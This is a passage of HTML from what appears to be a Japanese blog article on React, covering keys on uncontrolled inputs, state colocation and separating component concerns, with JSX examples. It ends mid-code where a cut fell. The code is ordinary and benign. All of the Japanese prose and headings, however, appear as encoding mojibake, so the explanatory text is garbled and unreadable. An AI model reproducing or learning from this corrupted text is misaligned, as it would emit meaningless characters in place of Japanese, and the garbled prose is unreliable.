<p>keyã®ç”¨é€”ã¯ãƒªã‚¹ãƒˆã«é™ã‚Šã¾ã›ã‚“ã€‚Reactä¸Šã§ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚„DOMè¦ç´ ã®è­˜åˆ¥æƒ…å ±ã‚’åˆ¶å¾¡ã™ã‚‹ã®ã«æœ‰ç›Šãªãƒ„ãƒ¼ãƒ«ã§ã™ã€‚Reactã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã®stateã‚’ç•°ãªã‚‹ãƒ“ãƒ¥ãƒ¼ä¸Šã§ä¿æŒã™ã‚‹éš›ã€keyã¨ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚¿ã‚¤ãƒ—ãŒä½¿ã‚ã‚Œã‚‹ã¨ã„ã†ã“ã¨ã‚’è¦šãˆã¦ãŠãã¾ã—ã‚‡ã†ã€‚ã¤ã¾ã‚Šã€keyã¯åŒã˜ã§ã‚‚ã‚¿ã‚¤ãƒ—ãŒç•°ãªã‚Œã°ã€ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã¯ã‚¢ãƒ³ãƒã‚¦ãƒ³ãƒˆãŠã‚ˆã³å†ãƒã‚¦ãƒ³ãƒˆã•ã‚Œã¾ã™ã€‚ã“ã‚Œã‚‰ã®å ´åˆã€ä¸€èˆ¬çš„ã«ã¯stateã®ãƒªãƒ•ãƒˆã‚¢ãƒƒãƒ—ã®æ–¹ãŒè‰¯ã„æ–¹æ³•ã§ã™ã€‚</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token comment">// State lifting approach for preserving state across different views (keys are no good here...)</span>
<span class="token keyword">const</span> <span class="token function-variable function">TabContent</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> activeTab <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token comment">// State that needs to be preserved across tab changes</span>
  <span class="token keyword">const</span> <span class="token punctuation">[</span>sharedState<span class="token punctuation">,</span> setSharedState<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    <span class="token comment">/* initial state */</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token punctuation">{</span>activeTab <span class="token operator">===</span> <span class="token string">"profile"</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">ProfileTab</span></span> <span class="token attr-name">state</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>sharedState<span class="token punctuation">}</span></span> <span class="token attr-name">onStateChange</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>setSharedState<span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span>
      <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token plain-text">
      </span><span class="token punctuation">{</span>activeTab <span class="token operator">===</span> <span class="token string">"settings"</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">SettingsTab</span></span> <span class="token attr-name">state</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>sharedState<span class="token punctuation">}</span></span> <span class="token attr-name">onStateChange</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>setSharedState<span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span>
      <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token plain-text">
      </span><span class="token punctuation">{</span><span class="token comment">/* Other tabs */</span><span class="token punctuation">}</span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ã“ã®å ´åˆã€ã‚¿ãƒ–é–“ã§ã‚¿ã‚¤ãƒ—ï¼ˆãŠã‚ˆã³å‚ç…§å…ˆï¼‰ãŒç•°ãªã‚‹ãŸã‚ã€keyã‚’ä¿æŒã™ã‚‹ã ã‘ã§ã¯ä¸ååˆ†ã§ã™ã€‚</p>
<p>ã—ã‹ã—ã€<code class="language-text">key</code>ã¨éåˆ¶å¾¡ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’ç”¨ã„ãŸä»¥ä¸‹ã®ä¾‹ã‚’ã”è¦§ãã ã•ã„ã€‚</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">const</span> <span class="token function-variable function">UserForm</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> userId <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token comment">// No React state here - using uncontrolled inputs</span>

  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span>
        <span class="token attr-name">key</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>userId<span class="token punctuation">}</span></span>
        <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span>
        <span class="token comment">// Uncontrolled input with defaultValue instead of value</span>
        <span class="token attr-name">defaultValue</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span>
      <span class="token punctuation">/></span></span><span class="token plain-text">
      </span><span class="token punctuation">{</span><span class="token comment">/* Other form inputs */</span><span class="token punctuation">}</span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>userIdã«åŸºã¥ãkeyã‚’éåˆ¶å¾¡å…¥åŠ›ã«ä¸ãˆã‚‹ã“ã¨ã§ã€Reactã¯userIdãŒå¤‰ã‚ã‚‹ãŸã³ã«å…¨ãæ–°ã—ã„DOMè¦ç´ ã‚’ä½œæˆã™ã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚éåˆ¶å¾¡å…¥åŠ›ã®stateãŒReactã®stateã§ã¯ãªãDOMè‡ªä½“ã®ä¸­ã«å­˜åœ¨ã™ã‚‹ãŸã‚ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’åˆ‡ã‚Šæ›¿ãˆã‚‹éš›ã«å…¥åŠ›ãŒåŠ¹æœçš„ã«ãƒªã‚»ãƒƒãƒˆã•ã‚Œã¾ã™ã€‚ã“ã®å ´åˆã€å¿…è¦ãªã®ã¯<code class="language-text">key</code>ã ã‘ã§ã™ã€‚</p>
<p>éå¸¸ã«ç§€é€¸ã§ã™ã€‚</p>
<h2>stateã‚³ãƒ­ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ï¼šå¼·åŠ›ãªãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ãƒ‘ã‚¿ãƒ¼ãƒ³</h2>
<p>stateã‚³ãƒ­ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€stateã‚’ä½¿ç”¨å ´æ‰€ã®ã§ãã‚‹ã ã‘è¿‘ãã«ã¨ã©ã‚ã¦ãŠããƒ‘ã‚¿ãƒ¼ãƒ³ã§ã™ã€‚ã“ã®ã‚¢ãƒ—ãƒ­ãƒ¼ãƒã§ã¯ã€stateå¤‰æ›´ã®å½±éŸ¿ã‚’ç›´æ¥å—ã‘ã‚‹ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã ã‘ãŒã‚¢ãƒƒãƒ—ãƒ‡ãƒ¼ãƒˆã•ã‚Œã‚‹ã‚ˆã†ã«ã™ã‚‹ã“ã¨ã§ã€ä¸è¦ãªå†ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã‚’æœ€å°é™ã«ã¨ã©ã‚ã¾ã™ã€‚</p>
<p>ä»¥ä¸‹ã®ä¾‹ã‚’ã”è¦§ãã ã•ã„ã€‚</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token comment">// Poor performance - entire app re-renders when filter changes</span>
<span class="token keyword">const</span> <span class="token function-variable function">App</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token punctuation">[</span>filterText<span class="token punctuation">,</span> setFilterText<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> filteredUsers <span class="token operator">=</span> users<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">user</span><span class="token punctuation">)</span> <span class="token operator">=></span> user<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>filterText<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span></span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">SearchBox</span></span> <span class="token attr-name">filterText</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>filterText<span class="token punctuation">}</span></span> <span class="token attr-name">onChange</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>setFilterText<span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">UserList</span></span> <span class="token attr-name">users</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>filteredUsers<span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">ExpensiveComponent</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span></span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p><code class="language-text">filterText</code>ãŒå¤‰ã‚ã‚‹ã¨ã€ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã®å½±éŸ¿ã‚’å—ã‘ãªã„<code class="language-text">ExpensiveComponent</code>ã‚‚å«ã‚ã¦<code class="language-text">App</code>ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆå…¨ä½“ãŒå†ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã•ã‚Œã¾ã™ã€‚
ã§ã¯ã€ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã®stateã‚’ã€ãã‚Œã‚’ä½¿ç”¨ã™ã‚‹ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã¨ã ã‘ã‚³ãƒ­ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">const</span> <span class="token function-variable function">UserSection</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token punctuation">[</span>filterText<span class="token punctuation">,</span> setFilterText<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> filteredUsers <span class="token operator">=</span> users<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">user</span><span class="token punctuation">)</span> <span class="token operator">=></span> user<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>filterText<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span></span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">SearchBox</span></span> <span class="token attr-name">filterText</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>filterText<span class="token punctuation">}</span></span> <span class="token attr-name">onChange</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>setFilterText<span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">UserList</span></span> <span class="token attr-name">users</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>filteredUsers<span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span></span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> <span class="token function-variable function">App</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span></span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">UserSection</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">ExpensiveComponent</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span></span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ãã†ã™ã‚‹ã¨ã€ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ãŒå¤‰ã‚ã£ã¦ã‚‚ã€<code class="language-text">UserSection</code>ã ã‘ãŒå†ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã•ã‚Œã¾ã™ã€‚ã“ã®ãƒ‘ã‚¿ãƒ¼ãƒ³ã¯ã€ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ã‚’æ”¹å–„ã™ã‚‹ã ã‘ã§ãªãã€å„ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆãŒä¿æŒã™ã‚‹stateã ã‘ã‚’ç®¡ç†ã™ã‚‹ã‚ˆã†ã«ã™ã‚‹ã“ã¨ã§ã€ã‚ˆã‚Šè‰¯ã„ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆè¨­è¨ˆã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚</p>
<h2>ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆè¨­è¨ˆï¼šå¤‰æ›´ã®æœ€é©åŒ–</h2>
<p>ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ã®æœ€é©åŒ–ã¯ã€ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆè¨­è¨ˆã«ãŠã„ã¦ã—ã°ã—ã°èª²é¡Œã¨ãªã‚Šã¾ã™ã€‚ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã®æ©Ÿèƒ½ãŒå¤šã™ãã‚‹ã¨ã€ä¸è¦ãªå†ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ãŒè¡Œã‚ã‚Œã‚‹å¯èƒ½æ€§ãŒé«˜ããªã‚Šã¾ã™ã€‚</p>
<p><code class="language-text">React.memo</code>ã«é ¼ã‚‹å‰ã«ã€ä»¥ä¸‹ã®ç‚¹ã‚’æ¤œè¨ã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚</p>
<ol>
<li><strong>ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã«è¤‡æ•°ã®è²¬ä»»ãŒä¸ãˆã‚‰ã‚Œã¦ã„ãªã„ã‹</strong>ã€‚è¤‡æ•°ã®é–¢å¿ƒäº‹ã‚’å‡¦ç†ã™ã‚‹ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã¯ã€é »ç¹ã«å†ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã™ã‚‹å¯èƒ½æ€§ãŒé«˜ããªã‚Šã¾ã™ã€‚</li>
<li><strong>stateã‚’ãƒªãƒ•ãƒˆã‚¢ãƒƒãƒ—ã—ã™ãã¦ã„ãªã„ã‹</strong>ã€‚stateã‚’ãƒ„ãƒªãƒ¼ä¸Šã§å¿…è¦ä»¥ä¸Šã«ãƒªãƒ•ãƒˆã‚¢ãƒƒãƒ—ã™ã‚‹ã¨ã€ã‚ˆã‚Šå¤šãã®ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆãŒå†ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã•ã‚Œã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚</li>
</ol>
<p>ä»¥ä¸‹ã®ä¾‹ã‚’ã”è¦§ãã ã•ã„ã€‚</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token comment">// Problematic design - mixed concerns</span>
<span class="token keyword">const</span> <span class="token function-variable function">ProductPage</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> productId <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token punctuation">[</span>selectedSize<span class="token punctuation">,</span> setSelectedSize<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token string">"medium"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> <span class="token punctuation">[</span>quantity<span class="token punctuation">,</span> setQuantity<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> <span class="token punctuation">[</span>shipping<span class="token punctuation">,</span> setShipping<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token string">"express"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> <span class="token punctuation">[</span>reviews<span class="token punctuation">,</span> setReviews<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// Fetches both product details and reviews</span>
  <span class="token function">useEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
    <span class="token function">fetchProductDetails</span><span class="token punctuation">(</span>productId<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fetchReviews</span><span class="token punctuation">(</span>productId<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>setReviews<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>productId<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">ProductInfo</span></span>
        <span class="token attr-name">selectedSize</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>selectedSize<span class="token punctuation">}</span></span>
        <span class="token attr-name">onSizeChange</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>setSelectedSize<span class="token punctuation">}</span></span>
        <span class="token attr-name">quantity</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>quantity<span class="token punctuation">}</span></span>
        <span class="token attr-name">onQuantityChange</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>setQuantity<span class="token punctuation">}</span></span>
      <span class="token punctuation">/></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">ShippingOptions</span></span> <span class="token attr-name">shipping</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>shipping<span class="token punctuation">}</span></span> <span class="token attr-name">onShippingChange</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>setShipping<span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Reviews</span></span> <span class="token attr-name">reviews</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>reviews<span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ã‚µã‚¤ã‚ºã€æ•°é‡ã€ã¾ãŸã¯é…é€ã‚ªãƒ—ã‚·ãƒ§ãƒ³ãŒå¤‰ã‚ã‚‹ãŸã³ã«ã€ç„¡é–¢ä¿‚ãªãƒ¬ãƒ“ãƒ¥ãƒ¼ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã‚‚å«ã‚ã¦ãƒšãƒ¼ã‚¸å…¨ä½“ãŒå†ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã•ã‚Œã¾ã™ã€‚</p>
<p>ã‚ˆã‚Šè‰¯ã„è¨­è¨ˆã¯ã€ä»¥ä¸‹ã®ã‚ˆã†ã«ã“ã‚Œã‚‰ã®é–¢å¿ƒäº‹ã‚’åˆ†ã‘ã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">const</span> <span class="token function-variable function">ProductPage</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> productId <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">ProductConfig</span></span> <span class="token attr-name">productId</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>productId<span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">ReviewsSection</span></span> <span class="token attr-name">productId</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>productId<span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> <span class="token function-variable function">ProductConfig</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> productId <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token punctuation">[</span>selectedSize<span class="token punctuation">,</span> setSelectedSize<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token string">"medium"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> <span class="token punctuation">[</span>quantity<span class="token punctuation">,</span> setQuantity<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> <span class="token punctuation">[</span>shipping<span class="token punctuation">,</span> setShipping<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token string">"express"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// Product-specific logic</span>

  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span></span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">ProductInfo</span></span>
        <span class="token attr-name">selectedSize</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>selectedSize<span class="token punctuation">}</span></span>
        <span class="token attr-name">onSizeChange</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>setSelectedSize<span class="token punctuation">}</span></span>
        <span class="token attr-name">quantity</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>quantity<span class="token punctuation">}</span></span>
        <span class="token attr-name">onQuantityChange</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>setQuantity<span class="token punctuation">}</span></span>
      <span class="token punctuation">/></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">ShippingOptions</span></span> <span class="token attr-name">shipping</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>shipping<span class="token punctuation">}</span></span> <span class="token attr-name">onShippingChange</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>setShipping<span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span></span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

